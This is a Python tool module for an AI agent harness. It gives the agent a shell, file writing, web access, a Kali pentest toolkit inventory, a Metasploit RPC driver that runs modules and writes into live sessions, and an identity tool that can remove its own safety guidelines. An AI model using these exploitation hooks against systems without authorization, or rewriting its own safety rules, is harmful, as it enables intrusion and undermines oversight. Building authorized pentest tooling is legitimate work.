"""Tool layer for SYGNIF py (the generic seat).

Built-in tools, all operating on the local machine as the seat user:
  * shell        — run a command on this host and return stdout+stderr+exit code.
  * read_file    — read a UTF-8 text file (optionally a line range).
  * write_file   — write/overwrite a UTF-8 text file (creates parent dirs).
  * note         — append a line to the working journal.
  * dev_apply_and_test — write one or more files, then run a check/test command
                   and report the combined result (the build->prove loop in one
                   call). This is SYGNIF py's generic "development" hand.
  * centre       — dispatch a neuron on a running SYGNIF py Centre (the knot
                   point: sys.state, note.*, knowledge.*, plus your own neurons).
  * commander    — call a tool on a running SYGNIF py commander (the hands:
                   sandboxed fs ops, code search, named-command exec).

Extensibility: drop a `custom_tools.py` next to this file, or a
`~/.sygnif/sygnif-py-tools.py`, that defines `register(reg)` and mutates the
registry dict. See custom_tools.py.example.
"""
from __future__ import annotations

import datetime
import ipaddress
import html as _html
import json
import os
import re
import time
import subprocess
import shlex
import urllib.error
import urllib.parse
import urllib.request

SEAT_DIR = os.path.dirname(os.path.abspath(__file__))

SHELL_TIMEOUT = int(os.environ.get("SYGNIF_PY_SHELL_TIMEOUT", "120"))
# Kali scans routinely run past the 120s shell cap — a full nmap, a nuclei run
# with many templates, or gobuster on a large wordlist all die mid-scan at 120s.
# The kali tool gets its own, longer budget (default 15 min) so a real scan can
# finish instead of being killed and reported as a truncated non-result.
KALI_TIMEOUT = int(os.environ.get("SYGNIF_PY_KALI_TIMEOUT", "900"))
MAX_OUTPUT = int(os.environ.get("SYGNIF_PY_MAXOUT", "8000"))
MAX_READ = int(os.environ.get("SYGNIF_PY_MAXREAD", "20000"))
JOURNAL = os.path.expanduser(
    os.environ.get("SYGNIF_PY_JOURNAL", "~/.sygnif/sygnif-py-journal.md")
)
DEV_TEST_TIMEOUT = int(os.environ.get("SYGNIF_PY_DEV_TEST_TIMEOUT", "300"))
CENTRE_URL = os.environ.get("SYGNIF_PY_CENTRE_URL", "http://127.0.0.1:9100")
CENTRE_TOKEN = os.environ.get("SYGNIF_PY_CENTRE_TOKEN", "").strip()
COMMANDER_URL = os.environ.get("SYGNIF_PY_COMMANDER_URL", "http://127.0.0.1:9110")
COMMANDER_TOKEN = os.environ.get("SYGNIF_PY_COMMANDER_TOKEN", "").strip()
HTTP_TIMEOUT = int(os.environ.get("SYGNIF_PY_TOOL_HTTP_TIMEOUT", "600"))

# On Windows there is no bash; fall back to the platform default shell.
_IS_WINDOWS = os.name == "nt"


def _truncate(text: str, limit: int = MAX_OUTPUT) -> str:
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[... output truncated at {limit} chars ...]"


_DOCKER_ROUTE = None  # cache: "" = local docker; "<ssh prefix> " = remote; False = none anywhere


def _docker_route():
    """Where Docker lives, computed once. Returns "" (local docker present — never
    reroute), an ssh command prefix (route Docker to a remote host), or False (no
    Docker anywhere — leave the command alone so it fails honestly).

    A Docker-less seat (e.g. the tablet) thus drives the sygnif-kali container and
    the AVD on e14 instead of silently falling back to host execution. Retarget or
    disable via SYGNIF_PY_DOCKER_SSH_HOST (default 'e14'; '' disables remote routing).
    Uses subprocess directly — never _run_host — so it cannot recurse."""
    global _DOCKER_ROUTE
    if _DOCKER_ROUTE is not None:
        return _DOCKER_ROUTE
    if _IS_WINDOWS:
        _DOCKER_ROUTE = ""
        return _DOCKER_ROUTE

    def _rc(cmd, t):
        try:
            return subprocess.run(["bash", "-lc", cmd], capture_output=True, timeout=t).returncode
        except Exception:  # noqa: BLE001
            return 1

    if _rc("command -v docker >/dev/null 2>&1", 10) == 0:
        _DOCKER_ROUTE = ""  # local docker: run as-is
        return _DOCKER_ROUTE
    host = os.environ.get("SYGNIF_PY_DOCKER_SSH_HOST", "e14")
    if host:
        q = shlex.quote(host)
        if _rc(f"ssh -o BatchMode=yes -o ConnectTimeout=8 {q} 'command -v docker >/dev/null 2>&1'", 25) == 0:
            _DOCKER_ROUTE = f"ssh -o BatchMode=yes {q} "
            return _DOCKER_ROUTE
    _DOCKER_ROUTE = False  # no docker locally or on the remote
    return _DOCKER_ROUTE


def _route_docker(command: str) -> str:
    """Rewrite a Docker-control command to run on the remote when local Docker is
    absent. Only touches 'docker ...' and the 'command -v docker' probe; the actual
    pentest payload rides inside 'docker exec ... bash -lc <payload>', so quoting the
    whole string once and handing it to ssh as a single argument survives both shells."""
    if _IS_WINDOWS:
        return command
    s = command.lstrip()
    if not (s.startswith("docker ") or s.startswith("command -v docker")):
        return command
    route = _docker_route()
    if isinstance(route, str) and route:  # remote
        return route + shlex.quote(command)
    return command  # "" local docker, or False = none anywhere


def _run_host(command: str, timeout: int) -> tuple[str, int]:
    """Run a command string on the host. Never raises. Docker-control commands are
    transparently routed to a remote host (see _docker_route) when this box has no
    local Docker, so a Docker-less seat still reaches the container stack on e14."""
    command = _route_docker(command)
    try:
        if _IS_WINDOWS:
            args, shell = command, True
        else:
            args, shell = ["bash", "-lc", command], False
        p = subprocess.run(
            args, shell=shell, capture_output=True, text=True, timeout=timeout
        )
        return (p.stdout or "") + (p.stderr or ""), p.returncode
    except subprocess.TimeoutExpired:
        return f"[timeout after {timeout}s]", 124
    except Exception as e:  # noqa: BLE001 - surface to the model, never crash the seat
        return f"[host exec error: {e}]", 1


# --- built-in tools ---------------------------------------------------------


def tool_shell(args: dict) -> str:
    command = str(args.get("command", "")).strip()
    if not command:
        return ("shell: ERROR — no 'command' was given, so NOTHING ran and you have\n"
                "observed NOTHING about this machine. Reissue the call with a real command\n"
                "in the 'command' field. Do NOT answer from memory or prior knowledge — you\n"
                "have not observed this system yet.")
    out, rc = _run_host(command, SHELL_TIMEOUT)
    return _truncate(out) + f"\nexit={rc}"


def tool_read_file(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path", "")).strip())
    if not path:
        return "read_file: empty path"
    start = int(args.get("start", 0) or 0)
    end = args.get("end")
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            lines = fh.readlines()
    except Exception as e:  # noqa: BLE001
        return f"[read_file error: {e}]"
    if start or end is not None:
        lines = lines[start : (int(end) if end is not None else None)]
    return _truncate("".join(lines), MAX_READ) or "(empty)"


def tool_write_file(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path", "")).strip())
    content = args.get("content", "")
    if not path:
        return "write_file: empty path"
    if not isinstance(content, str):
        content = str(content)
    try:
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
    except Exception as e:  # noqa: BLE001
        return f"[write_file error: {e}]"
    return f"wrote {len(content)} chars -> {path}"


def tool_note(args: dict) -> str:
    text = str(args.get("text", "")).strip()
    if not text:
        return "note: empty text"
    try:
        os.makedirs(os.path.dirname(JOURNAL), exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(JOURNAL, "a", encoding="utf-8") as fh:
            fh.write(f"- [{ts}] {text}\n")
    except Exception as e:  # noqa: BLE001
        return f"[note error: {e}]"
    return f"noted -> {JOURNAL}"


def tool_identity(args: dict) -> str:
    """View or CHANGE identity + standing instructions — either SYGNIF py's OWN
    (default) or a specific PROVIDER's (pass provider=<model key from config.json,
    e.g. 'fable'/'claude'/'openrouter-free'>). A provider's role/conduct overrides
    the seat's own when that provider is active; provider instructions are appended
    after the global ones. Safety guidelines are CUMULATIVE — global rules always apply
    and a provider only adds to them (it can tighten, never weaken). Changes persist to
    the identity file and take effect on the NEXT session. mode=show | set_role |
    set_conduct | add_instruction | remove_instruction | add_safety | remove_safety |
    reset. set_* / add take text=; remove takes index=; reset takes
    what=(all|role|conduct|instructions|safety). Omit provider= to act on the seat's own."""
    import identity as _id
    mode = str(args.get("mode", "show")).strip().lower()
    provider = str(args.get("provider", "")).strip()
    text = str(args.get("text", "")).strip()
    ov = _id.load_identity()
    who = f"provider '{provider}'" if provider else "SYGNIF py (own)"

    # resolve the dict we read/write: the provider sub-dict, or the top level.
    def _target(create: bool) -> dict:
        if not provider:
            return ov
        provs = ov.setdefault("providers", {}) if create else (ov.get("providers") or {})
        if create:
            return provs.setdefault(provider, {})
        p = provs.get(provider)
        return p if isinstance(p, dict) else {}

    if mode in ("show", ""):
        tgt = _target(create=False)
        if provider:
            role_src = "provider" if str(tgt.get("role") or "").strip() else (
                "global-override" if str(ov.get("role") or "").strip() else "default")
            cond_src = "provider" if str(tgt.get("conduct") or "").strip() else (
                "global-override" if str(ov.get("conduct") or "").strip() else "default")
        else:
            role_src = "OVERRIDE" if str(ov.get("role") or "").strip() else "default"
            cond_src = "OVERRIDE" if str(ov.get("conduct") or "").strip() else "default"
        instr = _id.effective_instructions(ov, provider or None)
        safety = _id.effective_safety(ov, provider or None)
        out = [f"== identity · {who} (effective) ==",
               f"[role · {role_src}]", _id.effective_role(ov, provider or None), "",
               f"[conduct · {cond_src}]", _id.effective_conduct(ov, provider or None), "",
               f"[safety guidelines · {len(safety)} · cumulative, global+provider]"]
        out += [f"  {i}. {x}" for i, x in enumerate(safety)] or ["  (none)"]
        out += ["", f"[standing instructions · {len(instr)}]"]
        out += [f"  {i}. {x}" for i, x in enumerate(instr)] or ["  (none)"]
        if not provider:
            provs = sorted((ov.get("providers") or {}).keys())
            out.append("\n[providers with an identity overlay]  "
                       + (", ".join(provs) if provs else "(none)"))
        out.append("\nfile: " + _id.IDENTITY_FILE
                   + "\n(edits apply on the next session; this one's prompt is already set)")
        return "\n".join(out)

    if mode == "set_role":
        if not text:
            return "identity set_role: give text= (the new role/identity). Use mode=reset what=role to restore."
        _target(create=True)["role"] = text
        _id.save_identity(ov)
        return f"identity: role for {who} set (effective next session). New role:\n\n{text}"

    if mode == "set_conduct":
        if not text:
            return "identity set_conduct: give text= (the new conduct block). Use mode=reset what=conduct to restore."
        _target(create=True)["conduct"] = text
        _id.save_identity(ov)
        return f"identity: conduct for {who} set (effective next session). New conduct:\n\n{text}"

    if mode == "add_instruction":
        if not text:
            return "identity add_instruction: give text= (one standing instruction to append)."
        tgt = _target(create=True)
        tgt.setdefault("instructions", []).append(text)
        _id.save_identity(ov)
        return (f"identity: added instruction #{len(tgt['instructions']) - 1} for {who} "
                f"(effective next session): {text}")

    if mode == "remove_instruction":
        tgt = _target(create=False)
        instr = list(tgt.get("instructions") or [])
        try:
            idx = int(str(args.get("index", "")).strip())
            removed = instr.pop(idx)
        except (ValueError, IndexError):
            return (f"identity remove_instruction: give a valid index= (0..{len(instr) - 1}) "
                    f"for {who}. Run mode=show{(' provider=' + provider) if provider else ''} to list them.")
        # write back into the live dict (which _target(create) would resolve to)
        _target(create=True)["instructions"] = instr
        _id.save_identity(ov)
        return f"identity: removed instruction #{idx} for {who}: {removed}"

    if mode == "add_safety":
        if not text:
            return "identity add_safety: give text= (one safety guideline). Safety is cumulative — global rules always apply and a provider only adds to them."
        tgt = _target(create=True)
        tgt.setdefault("safety", []).append(text)
        _id.save_identity(ov)
        return (f"identity: added safety guideline #{len(tgt['safety']) - 1} for {who} "
                f"(effective next session): {text}")

    if mode == "remove_safety":
        tgt = _target(create=False)
        rules = list(tgt.get("safety") or [])
        try:
            idx = int(str(args.get("index", "")).strip())
            removed = rules.pop(idx)
        except (ValueError, IndexError):
            return (f"identity remove_safety: give a valid index= (0..{len(rules) - 1}) for {who}. "
                    f"Note: index is into THIS layer's own safety list, not the merged view.")
        _target(create=True)["safety"] = rules
        _id.save_identity(ov)
        return f"identity: removed safety guideline #{idx} for {who}: {removed}"

    if mode == "reset":
        what = str(args.get("what", "all")).strip().lower()
        if provider:
            provs = ov.get("providers") or {}
            if what in ("all", ""):
                provs.pop(provider, None)
            elif what in ("role", "conduct"):
                (provs.get(provider) or {}).pop(what, None)
            elif what in ("instructions", "instruction"):
                (provs.get(provider) or {}).pop("instructions", None)
            elif what == "safety":
                (provs.get(provider) or {}).pop("safety", None)
            else:
                return "identity reset: what = all | role | conduct | instructions | safety."
            if provs.get(provider) == {}:
                provs.pop(provider, None)
            ov["providers"] = provs
        else:
            if what == "role":
                ov.pop("role", None)
            elif what == "conduct":
                ov.pop("conduct", None)
            elif what in ("instructions", "instruction"):
                ov.pop("instructions", None)
            elif what == "safety":
                ov.pop("safety", None)
            elif what in ("all", ""):
                # keep provider overlays; only clear the seat's own top-level identity
                ov = {"providers": ov.get("providers")} if ov.get("providers") else {}
            else:
                return "identity reset: what = all | role | conduct | instructions | safety."
        _id.save_identity(ov)
        return f"identity: reset {what or 'all'} for {who} to default (effective next session)."

    return ("identity mode = show | set_role | set_conduct | add_instruction | "
            "remove_instruction | add_safety | remove_safety | reset  "
            "(add provider=<model key> to target a provider).")


def tool_dev_apply_and_test(args: dict) -> str:
    """Write file(s), then run a check/test command, and report both outcomes.

    This is the generic 'development' hand: it turns an edit + a proof into one
    step, so the model can't claim done without the check actually running.

    Args:
      path + content       — write one file, OR
      files: [{path, content}, ...] — write several, then
      test                 — a shell command to prove it (pytest, build, run…).
    """
    written: list[str] = []
    batch = args.get("files")
    if not isinstance(batch, list):
        batch = []
        if args.get("path"):
            batch = [{"path": args.get("path"), "content": args.get("content", "")}]
    for spec in batch:
        if not isinstance(spec, dict) or not spec.get("path"):
            continue
        r = tool_write_file({"path": spec["path"], "content": spec.get("content", "")})
        written.append(r)
    test = str(args.get("test", "")).strip()
    parts = ["writes:"]
    parts.extend(f"  - {w}" for w in written) if written else parts.append("  (no files written)")
    if not test:
        parts.append("test: (none given — pass a 'test' command to prove the change)")
        return "\n".join(parts)
    out, rc = _run_host(test, DEV_TEST_TIMEOUT)
    parts.append(f"test: {test}")
    parts.append(_truncate(out))
    parts.append(f"exit={rc}  ({'PASS' if rc == 0 else 'FAIL'})")
    return "\n".join(parts)


def _http_json(url: str, payload: dict, token: str) -> tuple[dict | None, str]:
    """POST JSON, return (parsed, error). Never raises."""
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(
        url, data=json.dumps(payload).encode(), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT) as resp:
            return json.loads(resp.read().decode()), ""
    except urllib.error.HTTPError as e:
        return None, f"HTTP {e.code}: {e.read().decode(errors='replace')[:300]}"
    except Exception as e:  # noqa: BLE001
        return None, f"{type(e).__name__}: {e}"


def tool_centre(args: dict) -> str:
    """Dispatch a neuron on the running Centre (SYGNIF_PY_CENTRE_URL)."""
    neuron = str(args.get("neuron", "")).strip()
    if not neuron:
        return "centre: give a 'neuron' (e.g. sys.state, knowledge.search, note.write)"
    payload = {"tool": neuron, "args": args.get("args") or {}}
    data, err = _http_json(CENTRE_URL.rstrip("/") + "/rpc", payload, CENTRE_TOKEN)
    if err:
        return f"[centre unreachable at {CENTRE_URL}: {err} — is `sygnif-centre` running?]"
    return _truncate(json.dumps(data, indent=2, default=str))


def tool_commander(args: dict) -> str:
    """Call a tool on the running commander (SYGNIF_PY_COMMANDER_URL)."""
    name = str(args.get("name", "")).strip()
    if not name:
        return "commander: give a tool 'name' (e.g. fs_read, code_search, proc_exec)"
    if not COMMANDER_TOKEN:
        return ("commander: SYGNIF_PY_COMMANDER_TOKEN is not set in this seat's "
                "environment — start the commander and export its token so the seat can auth.")
    payload = {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
               "params": {"name": name, "arguments": args.get("args") or {}}}
    data, err = _http_json(COMMANDER_URL.rstrip("/") + "/rpc", payload, COMMANDER_TOKEN)
    if err:
        return f"[commander unreachable at {COMMANDER_URL}: {err} — is `sygnif-commander` running?]"
    if isinstance(data, dict) and data.get("error"):
        return f"[commander error: {json.dumps(data['error'])}]"
    try:
        return _truncate(data["result"]["content"][0]["text"])
    except Exception:
        return _truncate(json.dumps(data, indent=2, default=str))


# --- internet + github + kali (stdlib-only, no extra deps) ------------------

WEB_TIMEOUT = int(os.environ.get("SYGNIF_PY_WEB_TIMEOUT", "30"))
WEB_MAXBYTES = int(os.environ.get("SYGNIF_PY_WEB_MAXBYTES", "200000"))
_UA = os.environ.get("SYGNIF_PY_WEB_UA", "sygnif-py/1.0 (+https://github.com/Giansn/sygnif-py)")


def _http_get(url: str, headers: dict | None = None) -> tuple[str, int, str]:
    """GET a URL. Returns (body, status, error). Never raises."""
    h = {"User-Agent": _UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=WEB_TIMEOUT) as resp:
            raw = resp.read(WEB_MAXBYTES + 1)
            body = raw[:WEB_MAXBYTES].decode(errors="replace")
            if len(raw) > WEB_MAXBYTES:
                body += f"\n[... truncated at {WEB_MAXBYTES} bytes ...]"
            return body, getattr(resp, "status", 200), ""
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace")[:2000], e.code, f"HTTP {e.code}"
    except Exception as e:  # noqa: BLE001
        return "", 0, f"{type(e).__name__}: {e}"


def _strip_html(html: str) -> str:
    import re
    html = re.sub(r"(?is)<(script|style)[^>]*>.*?</\1>", " ", html)
    text = re.sub(r"(?s)<[^>]+>", " ", html)
    text = (text.replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">")
                .replace("&quot;", '"').replace("&#39;", "'").replace("&nbsp;", " "))
    return re.sub(r"[ \t]*\n[ \t\n]*", "\n", re.sub(r"[ \t]+", " ", text)).strip()


def tool_web(args: dict) -> str:
    """Reach the internet: fetch a URL, or run a web search (DuckDuckGo, no key)."""
    url = str(args.get("url", "")).strip()
    query = str(args.get("query", "")).strip()
    if not url and not query:
        return "web: give a 'url' to fetch, or a 'query' to search the web."
    if query and not url:
        import re
        import urllib.parse as _up
        q = _up.urlencode({"q": query})
        body = ""
        # duckduckgo.com/html resets from some hosts; html.* and lite.* are stabler.
        for base in ("https://html.duckduckgo.com/html/?", "https://lite.duckduckgo.com/lite/?"):
            body, status, err = _http_get(base + q)
            if body:
                break
        if not body:
            return f"[web search failed: {err}]"
        if re.search(r"(?i)bots use DuckDuckGo|complete the following challenge", body):
            return ("[web search blocked: the search engine served a bot challenge to "
                    "this host's network. Fetch a specific URL with web(url=...) instead, "
                    "or run this from a residential connection.]")
        hits = re.findall(r'result__a[^>]*href="([^"]+)"[^>]*>(.*?)</a>', body, re.S)
        if not hits:  # lite layout: links carry the target directly
            hits = [(h, h) for h in re.findall(r'href="(https?://[^"]+)"', body)
                    if "duckduckgo.com" not in h][:10]
        if not hits:
            return _truncate(_strip_html(body), 3000) or "[web search: no results parsed]"
        seen, lines = set(), []
        for href, title in hits:
            m = re.search(r"uddg=([^&]+)", href)
            link = _up.unquote(m.group(1)) if m else href
            if link in seen:
                continue
            seen.add(link)
            lines.append(f"- {_strip_html(title) or link}\n  {link}")
            if len(lines) >= 10:
                break
        return "web search: " + query + "\n" + "\n".join(lines)
    raw = str(args.get("raw", "")).lower() in ("1", "true", "yes")
    body, status, err = _http_get(url)
    if err and not body:
        return f"[web fetch failed: {err}]"
    text = body if raw else _strip_html(body)
    return f"GET {url} -> HTTP {status}\n" + _truncate(text)


def tool_github(args: dict) -> str:
    """Search GitHub for tools/repos (and optionally code). No key needed;
    GITHUB_TOKEN in the environment raises the rate limit if present."""
    import urllib.parse
    query = str(args.get("query", "")).strip()
    if not query:
        return "github: give a 'query', e.g. 'subdomain enumeration tool'."
    kind = str(args.get("kind", "repositories")).strip().lower()
    if kind not in ("repositories", "code"):
        kind = "repositories"
    qs = urllib.parse.urlencode({"q": query, "per_page": str(int(args.get("limit", 10) or 10)),
                                 "sort": "stars" if kind == "repositories" else "indexed"})
    headers = {"Accept": "application/vnd.github+json"}
    tok = os.environ.get("GITHUB_TOKEN", "").strip()
    if tok:
        headers["Authorization"] = f"Bearer {tok}"
    body, status, err = _http_get(f"https://api.github.com/search/{kind}?{qs}", headers)
    if err and not body:
        return f"[github search failed: {err}]"
    try:
        data = json.loads(body)
    except Exception:  # noqa: BLE001
        return f"[github: unparseable response (HTTP {status})]\n" + _truncate(body, 1000)
    items = data.get("items") or []
    if not items:
        msg = data.get("message")
        return f"github: no results for '{query}'" + (f" ({msg})" if msg else "")
    lines = [f"github {kind} for '{query}' (top {len(items[:10])} of {data.get('total_count', '?')}):"]
    for it in items[:10]:
        if kind == "repositories":
            lines.append(f"- {it.get('full_name')}  ★{it.get('stargazers_count', 0)}"
                         f"  {it.get('language') or ''}\n  {it.get('html_url')}"
                         f"\n  {(it.get('description') or '').strip()[:200]}")
        else:
            repo = (it.get("repository") or {}).get("full_name", "?")
            lines.append(f"- {repo}: {it.get('path')}\n  {it.get('html_url')}")
    return "\n".join(lines)


# The verified Kali arsenal, category -> tools, confirmed present AND functional
# in the sygnif-kali container on 2026-09-17 (each smoke-tested, not just on
# PATH). This is the honest inventory the pentest focus text only claimed: that
# text named tools that were not actually installed (katana, ligolo-ng,
# volatility3). This map is the fallback; tool_kali_tools queries the live
# container first, so a freshly provisioned or upgraded container reports its
# real state rather than this snapshot.
KALI_VERIFIED: dict[str, list[str]] = {
    "recon":        ["nmap", "masscan", "amass", "subfinder", "dnsx", "dnsrecon",
                     "dnsenum", "fierce", "theHarvester", "recon-ng", "whatweb",
                     "wafw00f", "sslscan", "sslyze", "httpx"],
    "web":          ["nikto", "gobuster", "feroxbuster", "ffuf", "dirb",
                     "dirbuster", "wfuzz", "sqlmap", "wpscan", "nuclei",
                     "commix", "xsser"],
    "passwords":    ["hydra", "medusa", "patator", "john", "hashcat", "hashid",
                     "hash-identifier", "crackmapexec", "netexec", "crunch", "cewl"],
    "smb_ad":       ["enum4linux", "enum4linux-ng", "smbclient", "smbmap",
                     "responder", "evil-winrm", "bloodhound-python",
                     "impacket-secretsdump", "impacket-psexec"],
    "exploit":      ["msfconsole", "msfvenom", "searchsploit"],
    "sniff_mitm":   ["wireshark", "tshark", "tcpdump", "bettercap", "ettercap"],
    "wireless":     ["aircrack-ng", "wifite", "reaver", "hcxdumptool"],
    "pivot":        ["proxychains", "proxychains4", "chisel", "socat"],
    "forensics_re": ["binwalk", "foremost", "radare2", "ghidra", "gdb",
                     "steghide", "exiftool"],
    "essentials":   ["curl", "wget", "openssl", "nc", "ncat"],
}


def _kali_probe_present(container: str, names: list[str]) -> list[str]:
    """Ask the running container which of `names` are on PATH. One exec, so the
    round trip stays cheap even for the full arsenal."""
    joined = " ".join(names)
    inner = 'for t in ' + joined + '; do command -v "$t" >/dev/null 2>&1 && echo "$t"; done'
    import shlex
    out, _ = _run_host(
        "docker exec " + container + " bash -lc " + shlex.quote(inner), 45)
    return out.split()


def tool_metasploit(args: dict) -> str:
    """Drive the Metasploit Framework through its RPC daemon in the sygnif-kali
    container — structured, not screen-scraped. This is the same RPC the Kali
    MetasploitMCP uses, reached in one hop via a bridge script, so results come
    back as clean data. Only act against AUTHORIZED targets.

    action (required):
      version                 — confirm the RPC is live and the MSF version
      search <query>          — find modules (args.query)
      info <module>           — a module's summary (args.module = full path)
      options <module>        — a module's options and which are required
      run <module> <opts>     — set opts (args.options dict) and execute; refuses
                                if required options are missing
      sessions                — list open sessions
      session_read <id>       — read pending output from a session
      session_write <id> <cmd>— send a command to a session (args.command)
    """
    import shlex
    action = str(args.get("action", "")).strip()
    if not action:
        return "metasploit: no action. Try action=version, or search/info/options/run/sessions."
    container = _toolbox_name(auto_create=True) or TOOLBOX_NAME
    if _IS_WINDOWS or _run_host("command -v docker", 10)[1] != 0:
        return "metasploit: docker not available; this tool needs the sygnif-kali container."
    st, _ = _run_host(
        "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
    if st.strip() != "running":
        _run_host("docker start " + container, 60)
        st, _ = _run_host(
            "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
        if st.strip() != "running":
            return "metasploit: container '" + container + "' is not running."

    argv = ["python3", "/sygnif-kali/msf-rpc.py", action]
    if action == "search":
        argv.append(str(args.get("query", "")).strip())
    elif action in ("info", "options"):
        argv.append(str(args.get("module", "")).strip())
    elif action == "run":
        argv.append(str(args.get("module", "")).strip())
        argv.append(json.dumps(args.get("options") or {}))
    elif action in ("session_read", "session_write"):
        argv.append(str(args.get("id", "")).strip())
        if action == "session_write":
            argv.append(str(args.get("command", "")))
    inner = " ".join(shlex.quote(a) for a in argv)
    out, rc = _run_host(
        "docker exec " + container + " bash -lc " + shlex.quote(inner), KALI_TIMEOUT)
    return _truncate(out) + ("\nexit=" + str(rc) + "  (msf rpc via docker:" + container + ")")


def tool_kali_tools(args: dict) -> str:
    """Report the Kali arsenal actually available, category by category.

    Queries the live sygnif-kali container so the answer is the container's real
    state, not a hardcoded claim; falls back to the verified map when Docker or
    the container is absent. `category` narrows the listing; `check` names one
    tool and confirms it is really on PATH. The point is that the seat never has
    to guess whether a tool exists before reaching for it via `kali`.
    """
    category = str(args.get("category", "")).strip().lower()
    check = str(args.get("check", "")).strip()
    container = _toolbox_name(auto_create=True) or TOOLBOX_NAME
    have_docker = not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0
    live = False
    if have_docker:
        st, _ = _run_host(
            "docker inspect -f '{{.State.Status}}' " + container + " 2>/dev/null", 10)
        live = st.strip() == "running"

    if check:
        if live:
            _, rc = _run_host(
                "docker exec " + container + " bash -lc " + repr("command -v " + check), 15)
            src = "docker:" + container
        else:
            _, rc = _run_host("command -v " + check, 10)
            src = "host"
        verdict = "available" if rc == 0 else "NOT found"
        return check + ": " + verdict + "  (checked on " + src + ")"

    if category and category not in KALI_VERIFIED:
        return ("unknown category. known: " + ", ".join(KALI_VERIFIED)
                + " (omit category to list all)")
    cats = {category: KALI_VERIFIED[category]} if category else KALI_VERIFIED

    lines: list[str] = []
    total = 0
    for cat, tool_list in cats.items():
        present = _kali_probe_present(container, tool_list) if live else tool_list
        total += len(present)
        lines.append("[" + cat + "] " + ", ".join(present))
    src = ("live: docker:" + container) if live else "fallback: verified map (container not running)"
    header = "Kali arsenal — " + str(total) + " tool(s) available (" + src + ")"
    return header + "\n" + "\n".join(lines)


# --- pentest engagement layer ------------------------------------------------
# Findings, phases and a shipped methodology, so the seat runs a pentest as a
# PROCESS, not just a pile of tools. Everything lands in the shared workspace so
# a 'kali' command in the container and 'read_file' on the host see the same
# files. Grounded to real evidence: a finding without proof is refused.
WORKSPACE = os.path.expanduser(
    os.environ.get("SYGNIF_PY_PENTEST_DIR", "~/sygnif-pentest"))
FINDINGS = os.path.join(WORKSPACE, "findings.jsonl")
PHASE_FILE = os.path.join(WORKSPACE, ".phase")
REPORT_FILE = os.path.join(WORKSPACE, "report.md")
AUDIT_FILE = os.path.join(WORKSPACE, "audit.jsonl")
INVENTORY = os.path.join(WORKSPACE, "hosts.jsonl")
PHASES = ["recon", "enum", "vuln", "exploit", "postexploit", "report"]
SEVERITIES = ["info", "low", "medium", "high", "critical"]
# A finding's evidence must be at least this many chars — a defence against the
# model recording a conclusion it did not actually observe in tool output.
MIN_EVIDENCE = int(os.environ.get("SYGNIF_PY_MIN_EVIDENCE", "20"))


def _current_phase() -> str:
    try:
        p = open(PHASE_FILE, encoding="utf-8").read().strip()
        return p if p in PHASES else PHASES[0]
    except OSError:
        return PHASES[0]


def tool_phase(args: dict) -> str:
    """Get or set the current engagement phase. The phase tags every finding, so
    the report reads as a methodical walk (recon -> enum -> vuln -> exploit ->
    postexploit -> report) rather than a heap. Call with no args to see where you
    are; pass set=<phase> to advance."""
    want = str(args.get("set", "")).strip().lower()
    if want:
        if want not in PHASES:
            return "unknown phase '" + want + "'. valid: " + " -> ".join(PHASES)
        try:
            os.makedirs(WORKSPACE, exist_ok=True)
            with open(PHASE_FILE, "w", encoding="utf-8") as fh:
                fh.write(want)
        except OSError as e:
            return "[phase: could not save: " + str(e) + "]"
        return "phase set to '" + want + "'  (order: " + " -> ".join(PHASES) + ")"
    cur = _current_phase()
    idx = PHASES.index(cur)
    nxt = PHASES[idx + 1] if idx + 1 < len(PHASES) else "(last)"
    return "current phase: " + cur + "   next: " + nxt + "   full order: " + " -> ".join(PHASES)


def tool_finding(args: dict) -> str:
    """Record a verified finding, with evidence REQUIRED. A finding with no
    evidence, or evidence too short to be real tool output, is refused — proof at
    every step. Fields: title, severity (info|low|medium|high|critical), target,
    evidence (the command run and a snippet of its real output), verify (a second
    independent observation, REQUIRED for high/critical), and optional
    description and recommendation. Findings are appended to the workspace and
    turned into a report by the 'report' tool."""
    title = str(args.get("title", "")).strip()
    severity = str(args.get("severity", "")).strip().lower()
    target = str(args.get("target", "")).strip()
    evidence = str(args.get("evidence", "")).strip()
    verify = str(args.get("verify", "")).strip()
    description = str(args.get("description", "")).strip()
    recommendation = str(args.get("recommendation", "")).strip()

    missing = [n for n, v in (("title", title), ("target", target), ("evidence", evidence)) if not v]
    if missing:
        return "finding REFUSED — missing required field(s): " + ", ".join(missing)
    if severity not in SEVERITIES:
        return "finding REFUSED — severity must be one of: " + ", ".join(SEVERITIES)
    if len(evidence) < MIN_EVIDENCE:
        return ("finding REFUSED — evidence too thin (" + str(len(evidence)) + " chars). "
                "Paste the actual command and a snippet of its real output; a finding must be "
                "backed by something you observed, not asserted.")
    if severity in ("high", "critical") and len(verify) < MIN_EVIDENCE:
        return ("finding REFUSED — a '" + severity + "' finding needs a SECOND, independent "
                "observation. Set 'verify' to a second command + output snippet (a re-run, a "
                "different tool, or a manual confirmation) that corroborates it. Single-source "
                "high/critical findings are not accepted in a client deliverable.")
    try:
        os.makedirs(WORKSPACE, exist_ok=True)
        n = 0
        if os.path.exists(FINDINGS):
            with open(FINDINGS, encoding="utf-8") as fh:
                n = sum(1 for _ in fh)
        rec = {
            "id": n + 1,
            "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "phase": _current_phase(),
            "severity": severity,
            "title": title,
            "target": target,
            "evidence": evidence,
            "verify": verify,
            "verified": bool(verify),
            "single_source": not bool(verify),
